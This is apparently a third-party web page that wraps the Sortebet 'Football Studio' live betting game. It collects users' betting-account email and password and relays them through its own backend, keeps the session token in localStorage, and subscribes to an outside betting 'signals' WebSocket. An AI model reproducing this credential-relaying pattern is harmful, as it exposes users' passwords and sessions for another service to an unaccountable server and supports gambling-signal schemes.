<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Sortebet - Football Studio</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', system-ui, sans-serif;
            background: #0a0c12;
            overflow: hidden;
            height: 100vh;
        }

        /* IFRAME DO JOGO (FUNDO) */
        .game-iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }

        /* OVERLAY DO FORMULÁRIO */
        .login-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 20% 30%, rgba(0, 0, 0, 0.9), rgba(8, 12, 24, 0.98));
            backdrop-filter: blur(14px);
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: opacity 0.4s ease;
        }

        .login-overlay.hidden {
            opacity: 0;
            visibility: hidden;
        }

        /* CARD DE LOGIN */
        .login-card {
            background: linear-gradient(145deg, #13161f, #0b0e16);
            border-radius: 48px;
            padding: 2rem;
            width: 90%;
            max-width: 420px;
            text-align: center;
            border: 1px solid rgba(0, 230, 118, 0.25);
            box-shadow: 0 30px 50px -15px rgba(0, 0, 0, 0.6);
        }

        .login-card h1 {
            font-size: 2rem;
            background: linear-gradient(135deg, #00e676, #00b0f0);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .login-card input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            background: #0c0f17;
            border: 1.5px solid #252b3a;
            border-radius: 28px;
            color: white;
            font-size: 1rem;
        }

        .login-card input:focus {
            outline: none;
            border-color: #00e676;
        }

        .login-card button {
            width: 100%;
            padding: 14px;
            margin-top: 16px;
            background: linear-gradient(105deg, #00b248, #00e676);
            border: none;
            border-radius: 60px;
            color: #0a0c12;
            font-weight: bold;
            cursor: pointer;
        }

        .login-card button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .error-msg {
            color: #ff7a7a;
            margin-top: 12px;
            font-size: 0.8rem;
        }

        .success-msg {
            color: #00e676;
            margin-top: 12px;
            font-size: 0.8rem;
        }

        .loading {
            display: none;
            margin-top: 16px;
        }

        .loading.active {
            display: block;
        }

        .spinner {
            width: 30px;
            height: 30px;
            border: 3px solid #252b3a;
            border-top-color: #00e676;
            border-radius: 50%;
            margin: 0 auto;
            animation: spin 0.7s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .back-btn {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: #1e2332cc;
            backdrop-filter: blur(8px);
            border: 1px solid rgba(0,230,118,0.4);
            padding: 10px 20px;
            border-radius: 60px;
            color: white;
            cursor: pointer;
            z-index: 1002;
            display: none;
        }

        .back-btn.active {
            display: block;
        }

        .saved-session {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(0,230,118,0.2);
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 11px;
            color: #00e676;
            z-index: 1002;
        }
    </style>
</head>
<body>

    <!-- IFRAME DO JOGO -->
    <iframe id="gameFrame" class="game-iframe" src="about:blank"></iframe>

    <!-- OVERLAY DO FORMULÁRIO -->
    <div id="loginOverlay" class="login-overlay">
        <div class="login-card">
            <h1>SORTEBET</h1>
            <p style="color: #9aa3b8; margin: 8px 0 20px;">Football Studio VIP</p>
            
            <input type="email" id="email" placeholder="Email ou CPF">
            <input type="password" id="password" placeholder="Senha">
            
            <button id="loginBtn" onclick="doLogin()">🎮 ENTRAR E JOGAR</button>
            
            <div id="loading" class="loading">
                <div class="spinner"></div>
                <p style="margin-top: 8px; color: #9aa3b8;">Autenticando...</p>
            </div>
            <div id="messageArea"></div>
        </div>
    </div>

    <div id="savedSessionBadge" class="saved-session" style="display: none;">
        🔄 Sessão ativa
    </div>

    <button id="backBtn" class="back-btn" onclick="resetLogin()">← Voltar / Trocar conta</button>

    <script>
        const TABLE_ID = 'TopCard000000001';
        const CLIENT_VERSION = '6.20260612.73024.62644-7774ff9958-r2';
        
        let currentEmail = null;
        let currentSessionId = null;

        // Verificar se já tem sessão salva
        async function checkSavedSession() {
            const savedEmail = localStorage.getItem('user_email');
            const savedSession = localStorage.getItem('evo_session_id');
            const savedTime = localStorage.getItem('session_time');
            
            if (savedEmail && savedSession && savedTime) {
                const elapsed = Date.now() - parseInt(savedTime);
                if (elapsed < 3600000) { // 1 hora
                    console.log('🔄 Sessão salva encontrada!');
                    currentEmail = savedEmail;
                    currentSessionId = savedSession;
                    document.getElementById('savedSessionBadge').style.display = 'block';
                    document.getElementById('email').value = savedEmail;
                    
                    // Carrega o jogo automaticamente
                    loadGameWithSession(savedSession);
                    return true;
                }
            }
            return false;
        }

        function loadGameWithSession(sessionId) {
            const gameUrl = `https://sortenabet.evo-games.com/frontend/evo/r2/?EVOSESSIONID=${sessionId}&table_id=${TABLE_ID}&client_version=${CLIENT_VERSION}`;
            
            const iframe = document.getElementById('gameFrame');
            iframe.src = gameUrl;
            
            document.getElementById('loginOverlay').classList.add('hidden');
            document.getElementById('backBtn').classList.add('active');
            
            // Conecta WebSocket de sinais
            connectWebSocket();
        }

        async function doLogin() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const loginBtn = document.getElementById('loginBtn');
            const loadingDiv = document.getElementById('loading');
            const messageArea = document.getElementById('messageArea');
            
            messageArea.innerHTML = '';
            
            if (!email || !password) {
                messageArea.innerHTML = '<div class="error-msg">⚠️ Preencha email e senha</div>';
                return;
            }
            
            loginBtn.disabled = true;
            loadingDiv.classList.add('active');
            
            try {
                // 🔥 CHAMA SEU BACKEND NO RAILWAY
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });
                
                const data = await response.json();
                
                if (data.success && data.iframeUrl) {
                    // Salva sessão
                    currentEmail = email;
                    currentSessionId = data.sessionId;
                    localStorage.setItem('user_email', email);
                    localStorage.setItem('evo_session_id', data.sessionId);
                    localStorage.setItem('session_time', Date.now().toString());
                    
                    messageArea.innerHTML = '<div class="success-msg">✅ Login realizado! Carregando jogo...</div>';
                    
                    setTimeout(() => {
                        const iframe = document.getElementById('gameFrame');
                        iframe.src = data.iframeUrl;
                        
                        document.getElementById('loginOverlay').classList.add('hidden');
                        document.getElementById('backBtn').classList.add('active');
                        document.getElementById('savedSessionBadge').style.display = 'block';
                        
                        loginBtn.disabled = false;
                        loadingDiv.classList.remove('active');
                        
                        // Conecta WebSocket
                        connectWebSocket();
                    }, 1000);
                    
                } else {
                    messageArea.innerHTML = '<div class="error-msg">❌ ' + (data.error || 'Falha na autenticação') + '</div>';
                    loginBtn.disabled = false;
                    loadingDiv.classList.remove('active');
                }
                
            } catch (error) {
                console.error('Erro:', error);
                messageArea.innerHTML = '<div class="error-msg">❌ Erro de conexão com o servidor</div>';
                loginBtn.disabled = false;
                loadingDiv.classList.remove('active');
            }
        }

        function resetLogin() {
            // Volta para o formulário de login
            document.getElementById('loginOverlay').classList.remove('hidden');
            document.getElementById('backBtn').classList.remove('active');
            
            // Limpa o iframe
            document.getElementById('gameFrame').src = 'about:blank';
            
            // Limpa campos (opcional)
            document.getElementById('password').value = '';
            
            if (window.wsSignal) {
                window.wsSignal.close();
            }
        }

        function connectWebSocket() {
            const wsUrl = 'wss://apiglobal.appbackend.tech/ws/signals/entrance/football-studio';
            
            if (window.wsSignal) {
                window.wsSignal.close();
            }
            
            window.wsSignal = new WebSocket(wsUrl);
            
            window.wsSignal.onopen = () => {
                console.log('✅ Sinais conectados');
            };
            
            window.wsSignal.onmessage = (event) => {
                try {
                    const data = JSON.parse(event.data);
                    console.log('📡 Sinal:', data);
                } catch(e) {}
            };
            
            window.wsSignal.onerror = (err) => {
                console.error('WebSocket error:', err);
            };
            
            window.wsSignal.onclose = () => {
                console.log('WebSocket desconectado, reconectando...');
                setTimeout(connectWebSocket, 5000);
            };
        }

        // Verifica sessão salva ao carregar
        checkSavedSession();
    </script>

</body>
</html>
